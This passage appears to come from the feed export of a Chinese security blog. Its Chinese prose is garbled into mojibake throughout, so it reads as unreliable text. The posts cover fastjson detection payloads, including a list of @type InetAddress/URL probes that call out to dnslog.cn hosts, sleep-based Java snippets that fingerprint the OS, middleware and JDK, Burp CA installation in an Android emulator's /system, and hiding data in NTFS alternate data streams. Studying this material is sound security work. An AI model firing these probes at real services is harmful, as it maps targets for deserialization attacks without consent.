id="ç‰ˆæœ¬æ¢æµ‹">ç‰ˆæœ¬æ¢æµ‹</span></h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement">https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement</a></p><p><strong>å…·ä½“ç‰ˆæœ¬æ¢æµ‹</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://b1ue.cn/archives/402.html">https://b1ue.cn/archives/402.html</a></p><p>å…·ä½“åŸç†æ˜¯JavaBeanDeserializer ç±»å¼‚å¸¸çš„ message ä¼šæŠŠå½“å‰ fastjson çš„ç‰ˆæœ¬å·è¾“å‡ºï¼Œæ‰€ä»¥éœ€è¦æ„é€ å‡ºèƒ½ä»¤è¿™ä¸ªç±»æŠ›å‡ºå¼‚å¸¸çš„é”™è¯¯å³å¯</p><p><img src="https://cdn.clown2024.cn/202409052248218.png" alt="image-20240905224846071"></p><p>è¿™é‡Œç›´æ¥åˆ—å‡ºæ–‡ç« éœ€è¦æ»¡è¶³çš„æŠ¥é”™æ¡ä»¶ï¼š</p><ul><li>å½“ä»£ç ä½¿ç”¨ <code>JSON.parseObject(json , clazz)</code> æŒ‡å®šæœŸæœ›ç±»çš„æ–¹å¼å»è§£æ JSONï¼Œä¸” clazz ä¸èƒ½ä¸º fastjson å·²è®¾å®šçš„å¤§éƒ¨åˆ†ç±»å‹ï¼Œå¦‚â€œHashmapâ€ã€â€œArrayListâ€</li><li>å½“ä½¿ç”¨ <code>JSON.parse(json)</code> ä¸æŒ‡å®šæœŸæœ›ç±»çš„æ—¶å€™å¯ä»¥é€šè¿‡ AutoCloseable æ¥è§¦å‘</li></ul><p>æ¯”å¦‚è¿™æ ·ï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>   <span class="hljs-comment">//è¯¥æ–¹æ³•å°è¯•äº†ä¸€ä¸‹ç›´åˆ°1.2.80éƒ½è¿˜å¯ä»¥æ¢æµ‹å‡º</span><br> <br><span class="hljs-comment">//ä¸‹é¢è¿™ä¸ªæ®è¯´ä¹Ÿèƒ½æ¢æµ‹ï¼Œä½†æ˜¯è¯¥é¶åœºæ²¡æœ‰æˆåŠŸ</span><br><span class="hljs-punctuation">[</span><span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409052252040.png" alt="image-20240905225213882"></p><p><strong>æ¢æµ‹DNS</strong></p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/why811/article/details/133679673">https://blog.csdn.net/why811/article/details/133679673</a></p><p>DNSæ¢æµ‹ä¸»è¦æ˜¯ä¸ºäº†æ¢æµ‹æ˜¯å¦ä¸ºfastjson</p><p>è¿™é‡Œdnslogå¯ä»¥ç›´æ¥ç”¨yakitç”Ÿæˆ</p><p><img src="https://cdn.clown2024.cn/202409051322413.png" alt="image-20240905132158243"></p><p>è¿™é‡Œçº¯æ”¶é›†payloadå¤ç°äº†ï¼Œæ²¡æ‰¾åˆ°ä»€ä¹ˆåˆ†æçš„æ–‡ç« </p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetAddress&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;muwoiavfqk.dgrh3.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>ä¸è¿‡è¿™ä¸ªgadgetåœ¨1.2.48ç¦æ­¢äº†</p></blockquote><p>1.2.68ç‰ˆæœ¬ç»“æœ</p><p><img src="https://cdn.clown2024.cn/202409051325045.png" alt="image-20240905132543897"></p><p>ç¬‘æ­»yakitçš„dnslogæ²¡è®°å½•å‡ºæ¥ï¼Œdnslogå¹³å°çš„å¯ä»¥</p><p><img src="https://cdn.clown2024.cn/202409051337491.png" alt="image-20240905133750354"></p><p><img src="https://cdn.clown2024.cn/202409051337590.png" alt="image-20240905133730460"></p><p>å„ç§payload</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet6Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//ä¸‹é¢æ˜¯ä¸€äº›ç•¸å½¢payloadï¼Œä¼šæŠ¥é”™ä½†æ˜¯ä¹Ÿèƒ½è§¦å‘dnslog</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaa&quot;</span><span class="hljs-punctuation">&#125;</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯èƒ½æœ‰æ—¶å€™æ¢æµ‹å‡ºç°é—®é¢˜ï¼Œè¯´type not matchï¼Œå…¶å®åŸå› æ˜¯ï¼Œæœ‰çš„å¼€å‘åœ¨ä½¿ç”¨fastjsonè§£æè¯·æ±‚æ—¶ä¼šä½¿ç”¨Springçš„@RequestBodyæ³¨é‡Šï¼Œå‘Šè¯‰è§£æå¼•æ“ï¼Œæˆ‘éœ€è¦çš„æ˜¯ä¸€ä¸ªUserç±»å¯¹è±¡</p><p>æœ€å¤–å±‚ä¸€å®šæ˜¯æ•°ç»„æˆ–è€…å¯¹è±¡ï¼Œä¸è¦åŠ @typeï¼Œç„¶åå°†Payloadä½œä¸ºå…¶ä¸­ä¸€ä¸ªé”®å€¼ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-string">&quot;xxx&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·å†™é€šå¸¸å°±ä¸ä¼šæœ‰type not matchçš„</p><p><code>ä¸‹é¢çš„æ¢æµ‹æ˜¯å­˜åœ¨fastjsonå¹¶ä¸”å¯ä»¥åŠ è½½å­—èŠ‚ç çš„æƒ…å†µï¼Œçº¯ç²¹è®°å½•æ²¡æœ‰å°è¯•è¿‡</code></p><h2><span id="æ“ä½œç³»ç»Ÿæ¢æµ‹">æ“ä½œç³»ç»Ÿæ¢æµ‹</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">osName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();<br>        System.out.println(osName);<br>        <span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;nix&quot;</span>) || osName.contains(<span class="hljs-string">&quot;nux&quot;</span>) || osName.contains(<span class="hljs-string">&quot;mac&quot;</span>))<br>        &#123;<br>            Thread.sleep(<span class="hljs-number">3000</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>            Thread.sleep(<span class="hljs-number">6000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            Thread.sleep(<span class="hljs-number">9000</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><h2><span id="ä¸­é—´ä»¶æ¢æµ‹">ä¸­é—´ä»¶æ¢æµ‹</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">stackTraces</span> <span class="hljs-operator">=</span> Thread.getAllStackTraces();<br>        <span class="hljs-keyword">for</span> (Map.Entry entry : stackTraces.entrySet()) &#123;<br>            StackTraceElement[] stackTraceElements = entry.getValue();<br>            <span class="hljs-keyword">for</span> (StackTraceElement element : stackTraceElements) &#123;<br><span class="hljs-comment">// element.getClassName().contains(&quot;org.springframework.web&quot;</span><br>                <span class="hljs-keyword">if</span> (element.getClassName().contains(<span class="hljs-string">&quot;org.apache.catalina.core&quot;</span>)) &#123;<br>                    Thread.sleep(<span class="hljs-number">5000</span>);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h2><span id="æ¢æµ‹jdkç‰ˆæœ¬">æ¢æµ‹JDKç‰ˆæœ¬</span></h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// è·å– Java ç‰ˆæœ¬</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">javaVersion</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>);<br><span class="hljs-comment">// è§£æä¸»ç‰ˆæœ¬å·</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">majorVersion</span> <span class="hljs-operator">=</span> Integer.parseInt(javaVersion.split(<span class="hljs-string">&quot;\\.&quot;</span>)[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">// è¿›â¾ç‰ˆæœ¬åˆ¤æ–­</span><br>        <span class="hljs-keyword">switch</span> (majorVersion) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                Thread.sleep(<span class="hljs-number">2000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>                Thread.sleep(<span class="hljs-number">3000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>                Thread.sleep(<span class="hljs-number">4000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                Thread.sleep(<span class="hljs-number">5000</span>);<br>                <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;fastjsonä»‹ç»&quot;&gt;fastjsonä»‹ç»&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;å®˜æ–¹githubåœ°å€ï¼š&lt;a href=&quot;https://github.com/alibaba/fastjson&quot;&gt;https://github.com/alibaba/fastj</summary>
      
    
    
    
    <category term="javaæ¼æ´" scheme="https://clowsman.github.io/categories/java%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>flaskå†…å­˜é©¬å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/08/17/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/08/17/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-08-17T08:42:44.000Z</published>
    <updated>2024-08-17T09:56:06.004Z</updated>
    
    
    
    
    
    <category term="å†…å­˜é©¬" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>APPæ¸—é€æŠ“åŒ…ç¯å¢ƒé…ç½®</title>
    <link href="https://clowsman.github.io/2024/08/15/APP%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>https://clowsman.github.io/2024/08/15/APP%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2024-08-15T10:52:02.000Z</published>
    <updated>2024-08-15T17:34:27.424Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®">æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®</span></h1><p>è¿™é‡Œç”¨é›·ç”µæ¨¡æ‹Ÿå™¨</p><p>ipconfigæŸ¥çœ‹ä¸€ä¸‹æœ¬æœºçš„IP</p><p><img src="https://cdn.clown2024.cn/202408151921468.png" alt="image-20240815192142415"></p><p>ç„¶ååœ¨burpæ·»åŠ ä¸€ä¸ªæ–°çš„ä»£ç†</p><p><img src="https://cdn.clown2024.cn/202408151922834.png" alt="image-20240815192241797"></p><p>ç„¶åæ¨¡æ‹Ÿå™¨ä¹Ÿè‡ªå®šä¹‰è¯¥ipåœ°å€</p><p><img src="https://cdn.clown2024.cn/202408151925440.png" alt="image-20240815192521373"></p><h1><span id="è¯ä¹¦å®‰è£…">è¯ä¹¦å®‰è£…</span></h1><p>è¿™é‡Œå¦‚æœè¦æŠ“httpsè¿˜éœ€è¦å®‰è£…ä¸€ä¸‹burpè¯ä¹¦ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/06.%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85/">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/06.%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85/</a></p><blockquote><p>ä½†æ˜¯Android ä» 7.0 å¼€å§‹ï¼Œç³»ç»Ÿä¸å†ä¿¡ä»»ç”¨æˆ· CA è¯ä¹¦ï¼Œå®‰è£…è¯ä¹¦çš„æ–¹å¼å°±éº»çƒ¦ä¸€ç‚¹</p></blockquote><p>é¦–å…ˆè®¿é—®burpçš„ç›‘å¬åœ°å€ä¸‹è½½è¯ä¹¦</p><p><img src="https://cdn.clown2024.cn/202408151927057.png" alt="image-20240815192723003"></p><p>æ‰“å¼€æ–‡ä»¶ç®¡ç†å™¨å¯ä»¥çœ‹åˆ°è¯ä¹¦</p><p><img src="https://cdn.clown2024.cn/202408151928262.png" alt="image-20240815192845208"></p><p>ç„¶åç”¨kalié‡Œçš„å·¥å…·opensslè®¡ç®—è¯ä¹¦å“ˆå¸Œå€¼</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">openssl x509 -inform der -subject_hash_old -<span class="hljs-keyword">in</span> cacert.der -noout<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408151939380.png" alt="image-20240815193917347"></p><p>å°†è¯ä¹¦åæ”¹ä¸º<code>&lt;hash&gt;.0</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> cacert.der 9a5ba575.0<br></code></pre></td></tr></table></figure><p>ç„¶åç”¨<code>MTç®¡ç†å™¨</code>å°†å…¶ç§»åŠ¨åˆ°<code>/system/etc/security/cacerts/</code>ç›®å½•</p><blockquote><p>é›·ç”µ9è¿™é‡Œä¼šå‡ºç°æŒ‚è½½å¤±è´¥æ— æ³•ç§»åŠ¨çš„æƒ…å†µ</p><p><img src="https://cdn.clown2024.cn/202408151952697.png" alt="image-20240815195250615"></p><p>è¦åœ¨è®¾ç½®â€“&gt;æ€§èƒ½è®¾ç½®ä¿®æ”¹ä¸€ä¸‹vmdkå¯å†™</p><p><img src="https://cdn.clown2024.cn/202408151954575.png" alt="image-20240815195457525"></p></blockquote><p>éš¾ç»·çš„è¿˜æ˜¯ä¸è¡Œï¼Œæ¢ç½‘æ˜“çš„MuMuæ¨¡æ‹Ÿå™¨å°±å¥½äº†ï¼Œè¿™é›·ç”µæ¨¡æ‹Ÿå™¨ä»€ä¹ˆæ¯›ç—…ğŸ¥²</p><p>æµç¨‹å’Œä¸Šé¢ä¸€æ ·ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/shr592833253/article/details/139395912">ç”¨æ‰‹æœºæ¨¡æ‹Ÿå™¨è¿›è¡ŒAPPæ¸—é€æµ‹è¯•æŠ“åŒ…(è¶…è¯¦ç»†ç‰ˆ)_æ‰‹æœºæ¨¡æ‹Ÿå™¨æŠ“åŒ…-CSDNåšå®¢</a></p><p>è¯ä¹¦æ”¾è¿‡å»çš„æ—¶å€™è¦è®°å¾—æœ‰è¶³å¤Ÿæƒé™ï¼Œæœ‰äº›å¯èƒ½ä¸å¤Ÿï¼Œå¯ä»¥ç›´æ¥ç”¨mtæ”¹</p><p><img src="https://cdn.clown2024.cn/202408152317058.png" alt="image-20240815231730970"></p><p>ç„¶åæŠŠ&#x2F;systemè¿™ä¸ªç›®å½•çš„æƒé™ä¹Ÿæ”¹æˆ777</p><p><img src="https://cdn.clown2024.cn/202408152319326.png" alt="image-20240815231905270"></p><p>ç„¶åå°±å¯ä»¥æ­£å¸¸æŠ“åŒ…ä¹Ÿæ²¡æœ‰è¯ä¹¦é—®é¢˜äº†</p><p><img src="https://cdn.clown2024.cn/202408152321450.png" alt="image-20240815232138363"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®&quot;&gt;æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;è¿™é‡Œç”¨é›·ç”µæ¨¡æ‹Ÿå™¨&lt;/p&gt;
&lt;p&gt;ipconfigæŸ¥çœ‹ä¸€ä¸‹æœ¬æœºçš„IP&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.clown2024.cn/202408151921468.png</summary>
      
    
    
    
    <category term="appæ¸—é€" scheme="https://clowsman.github.io/categories/app%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="æ¸—é€" scheme="https://clowsman.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>NTFSæ•°æ®æµéšå†™</title>
    <link href="https://clowsman.github.io/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/"/>
    <id>https://clowsman.github.io/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/</id>
    <published>2024-07-12T12:39:30.000Z</published>
    <updated>2024-07-15T06:42:10.915Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯åœ¨å‰æ–‡å­¦ä¹ mysqlææƒçš„æ—¶å€™é‡åˆ°çš„åˆ©ç”¨æ•°æ®æµå†™æ–‡ä»¶ï¼Œä»¥å‰æœ‰ç‚¹å°è±¡ä½†ä¸æ˜¯å¾ˆæ·±ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p><h1><span id="ntfsæ•°æ®æµä»‹ç»">NTFSæ•°æ®æµä»‹ç»</span></h1><p>åœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸­å­˜åœ¨ç€NTFSå¤‡ç”¨æ•°æ®æµï¼ˆAlternate Data Streamsï¼Œç®€ç§°ADSï¼‰ï¼Œè¿™æ˜¯NTFSç£ç›˜æ ¼å¼çš„ç‰¹æ€§ä¹‹ä¸€ã€‚æ¯ä¸€ä¸ªæ–‡ä»¶ï¼Œéƒ½æœ‰ç€ä¸»æ–‡ä»¶æµå’Œéä¸»æ–‡ä»¶æµï¼Œä¸»æ–‡ä»¶æµèƒ½å¤Ÿç›´æ¥çœ‹åˆ°ï¼›è€Œéä¸»æ–‡ä»¶æµå¯„å®¿äºä¸»æ–‡ä»¶æµä¸­ï¼Œæ— æ³•ç›´æ¥è¯»å–ï¼Œè¿™ä¸ªéä¸»æ–‡ä»¶æµå°±æ˜¯NTFSå¤‡ç”¨æ•°æ®æµã€‚</p><p>ADSçš„ä½œç”¨åœ¨äºï¼Œå®ƒå…è®¸ä¸€ä¸ªæ–‡ä»¶æºå¸¦ç€é™„åŠ çš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼ŒIEæµè§ˆå™¨ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œä¼šå‘æ–‡ä»¶æ·»åŠ ä¸€ä¸ªæ•°æ®æµï¼Œæ ‡è®°è¯¥æ–‡ä»¶æ¥æºäºå¤–éƒ¨ï¼Œå³å¸¦æœ‰é£é™©ï¼Œé‚£ä¹ˆï¼Œåœ¨ç”¨æˆ·æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå¼¹å‡ºæ–‡ä»¶è­¦å‘Šæç¤ºã€‚å†å¦‚ï¼Œåœ¨ç½‘å€æ”¶è—ä¸­ï¼Œä¹Ÿä¼šé™„åŠ ä¸€ä¸ªfaviconæ•°æ®æµä»¥å­˜æ”¾ç½‘ç«™å›¾æ ‡ã€‚</p><p>ADSä¹Ÿè¢«ç”¨äºä¸€äº›æ¶æ„æ–‡ä»¶éšè—è‡ªèº«,ä½œä¸ºåé—¨ã€‚</p><h1><span id="adsåº”ç”¨">ADSåº”ç”¨</span></h1><p>è¿™é‡Œå†™ä¸€ä¸ªéšè—æ–‡æœ¬æ¥çœ‹çœ‹ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªç©ºçš„example.txtï¼Œç„¶åå†™å…¥ADSï¼Œè¿™é‡Œå†™å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;123&quot;</span> &gt; example.txt:config <span class="hljs-comment">#è¿™é‡Œè¦ç”¨cmdï¼Œç”¨powershellä¼šæŠ¥é”™</span><br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥æ‰“å¼€æ–‡ä»¶è¿˜æ˜¯ç©ºçš„</p><p><img src="http://cdn.clown2024.cn/202407151442538.png" alt="image-20240713015237491"></p><p>æƒ³è¦æŸ¥çœ‹ADSçš„è¯å¯ä»¥è¿™æ ·</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">notepad example.txt:config<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442539.png" alt="image-20240713015437701"></p><p>è¿˜æœ‰ç”¨ä¸‹é¢å‘½ä»¤æŸ¥çœ‹è¯¥æ–‡ä»¶æ‰€æœ‰çš„ADS</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> example.txt /R<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442540.png" alt="image-20240713015550479"></p><p>ADSå¯ä»¥å†™ä»»ä½•ä¸œè¥¿ï¼ŒåŒ…æ‹¬å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥éšè—åé—¨ï¼Œåœ¨Windows XPä¸­ï¼Œå¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥éšè—å¹¶ä¸”è¢«æ‰§è¡Œã€‚ä½†æ˜¯ï¼Œå¾®è½¯å·²ç»å‘ç°äº†è¿™ä¸ªé—®é¢˜å¹¶è¿›è¡Œäº†ä¿®å¤ï¼Œç›®å‰åœ¨Windows VistaåŠåç»­ç³»ç»Ÿä¸­å·²ç»æ— æ³•ç›´æ¥è¿è¡ŒADSä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶äº†ã€‚</p><p>å¯ä»¥ç›´æ¥è¿™æ ·å†™å…¥æ–‡ä»¶ï¼Œå…¶ä»–æ–‡ä»¶åŒç†</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt; example.txt:<span class="hljs-number">01</span>.txt<br><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt;&gt; example.txt:<span class="hljs-number">01</span>.txt<br></code></pre></td></tr></table></figure><p>ADSæ•°æ®æµæ–‡ä»¶æœ‰ä¸‰ç§åˆ é™¤æ–¹å¼ã€‚ä¸€æ˜¯ç›´æ¥<strong>åˆ é™¤å®¿ä¸»</strong>æ–‡ä»¶ï¼ŒäºŒæ˜¯å°†å®¿ä¸»æ–‡ä»¶<strong>ç§»åˆ°</strong>FAT32<strong>ç­‰é</strong>NTFS<strong>åˆ†åŒºä¸­</strong>ï¼›ä¸‰æ˜¯åˆ©ç”¨<strong>å·¥å…·è½¯ä»¶</strong>ï¼Œå¦‚IceSwordã€Ntfs Streams Editoråˆ é™¤ã€‚</p><p>Ntfs Streams Editoråˆ é™¤å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">streams.exe -d &lt;File&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™æ˜¯åœ¨å‰æ–‡å­¦ä¹ mysqlææƒçš„æ—¶å€™é‡åˆ°çš„åˆ©ç”¨æ•°æ®æµå†™æ–‡ä»¶ï¼Œä»¥å‰æœ‰ç‚¹å°è±¡ä½†ä¸æ˜¯å¾ˆæ·±ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;h1&gt;&lt;span id=&quot;ntfsæ•°æ®æµä»‹ç»&quot;&gt;NTFSæ•°æ®æµä»‹ç»&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;åœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸­å­˜åœ¨ç€NTFSå¤‡ç”¨æ•°æ®æµï¼ˆAlternate Da</summary>
      
    
    
    
